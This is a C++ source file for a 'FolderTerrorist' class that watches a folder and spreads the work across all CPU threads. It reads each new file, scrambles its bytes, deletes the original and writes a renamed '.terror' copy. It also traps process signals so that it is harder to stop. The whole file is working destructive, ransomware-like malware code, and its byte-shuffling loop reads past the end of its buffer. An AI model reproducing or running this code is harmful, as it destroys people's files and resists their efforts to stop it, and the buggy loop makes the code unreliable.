#include "FolderTerrorist.h"
#include <filesystem>
#include <fstream>

FolderTerrorist::FolderTerrorist() {
    std::cout << "FolderTerrorist has been created!\n";
}

//FolderTerrorist::~FolderTerrorist() {
//    std::cout << "FolderTerrorist has been destroyed!\n";
//    delete p_instance;
//}

void FolderTerrorist::SetFolderName(const std::string &folder_name) {
    this->folder_name = folder_name;
}

const std::string &FolderTerrorist::GetFolderName() const {
    return folder_name;
}

std::vector<std::string> FolderTerrorist::GetFolderFiles() {
    std::cout << "scanning directory...\n";
    std::vector<std::string> files;
    for (auto &file: std::filesystem::directory_iterator(GetFolderName())) {
        files.push_back(file.path().string());
    }
    return files;
}

void FolderTerrorist::UpdateQueue() {
    if(border == -1) {
        while (true) {
            std::vector<std::string> folder_files = GetFolderFiles();
            std::this_thread::sleep_for(std::chrono::seconds(5));
            for (const auto &file: folder_files) {
                if (std::find(files_queue.begin(), files_queue.end(), file) == files_queue.end() &&
                    !file.ends_with(".terror")) {
                    std::lock_guard<std::mutex> guard(mtx);
                    std::cout << "A new file has been added to the queue: " << file << "\n";
                    files_queue.push_front(file);
                }
            }
        }
    } else {
        while (border > 0) {
            std::vector<std::string> folder_files = GetFolderFiles();
            std::this_thread::sleep_for(std::chrono::seconds(5));
            for (const auto &file: folder_files) {
                if (std::find(files_queue.begin(), files_queue.end(), file) == files_queue.end() &&
                    !file.ends_with(".terror")) {
                    std::lock_guard<std::mutex> guard(mtx);
                    std::cout << "A new file has been added to the queue: " << file << "\n";
                    files_queue.push_front(file);
                }
            }
            std::lock_guard<std::mutex> guard(mtx);
            if(border > 0) border--;
        }
    }
}

void FolderTerrorist::ReleaseQueue() {
    std::string filename;
    if(border == -1) {
        while (true) {
            {
                std::lock_guard<std::mutex> guard(mtx);
                if (!files_queue.empty()) {
                    filename = files_queue.back();
                    files_queue.pop_back();
                }
            }
            if (std::filesystem::exists(std::filesystem::path(filename)) && is_regular_file(std::filesystem::path(filename))) {
                FolderFileTerror(filename);
            }
        }
    } else {
        while (border > 0) {
            {
                std::lock_guard<std::mutex> guard(mtx);
                if (!files_queue.empty()) {
                    filename = files_queue.back();
                    files_queue.pop_back();
                }
            }
            if (std::filesystem::exists(std::filesystem::path(filename)) && is_regular_file(std::filesystem::path(filename))) {
                FolderFileTerror(filename);
            }
            std::lock_guard<std::mutex> guard(mtx);
            if(border > 0) border--;
        }
    }
}


void FolderTerrorist::FolderFileTerror(const std::string &filename) {
    std::ifstream ifs(filename, std::ios::binary);
    ifs.seekg(0, ifs.end);
    size_t file_size = ifs.tellg();
    ifs.seekg(0, ifs.beg);
    std::vector<uint8_t> bytes_buff(file_size);
    char *data_ptr = static_cast<char *>((void*)bytes_buff.data());
    ifs.read(data_ptr, file_size);
    std::cout << "Go to mix: " << filename << "\n";
    for(int i = 1; i<bytes_buff.size()+1; i++) {
        std::swap(bytes_buff[i-1], bytes_buff[i]);
    }
    ifs.close();
    std::remove(filename.c_str());
    std::filesystem::path path = std::filesystem::path(filename).parent_path() / std::filesystem::path(std::filesystem::path(filename).filename().string() + ".terror");
    std::ofstream ofs(path, std::ios::binary);
    ofs.write(data_ptr, bytes_buff.size());
    ofs.close();
}

void FolderTerrorist::Start() {
    std::cout << "FOLDER AT RISK: " << GetFolderName() << std::endl;
    if(!folder_name.empty()) this->Start(GetFolderName());
    else throw std::runtime_error("failed to start FolderTerrorist");
}

void FolderTerrorist::Start(std::string folder_name) {
    this->folder_name = folder_name;
    std::cout << "FOLDER AT RISK: " << GetFolderName() << std::endl;
    int max_num_of_threads = std::thread::hardware_concurrency();
    threads.emplace_back(&FolderTerrorist::UpdateQueue, this);
    for (int i = 0; i < max_num_of_threads - 1; i++) {
        threads.emplace_back(&FolderTerrorist::ReleaseQueue, this);
    }
    for (auto &i: threads) {
        i.join();
    }
}

void FolderTerrorist::SetTheBorder(int border) {
    this->border = border;
}

void FolderTerrorist::SignalsCatching() {
    for(int i = 1; i < 32; i++) std::signal(i, SignalsHandler);
}

void FolderTerrorist::SignalsHandler(int signal) {
    std::cout << "FolderTerrorist is invincible!!!" <<"\n";
}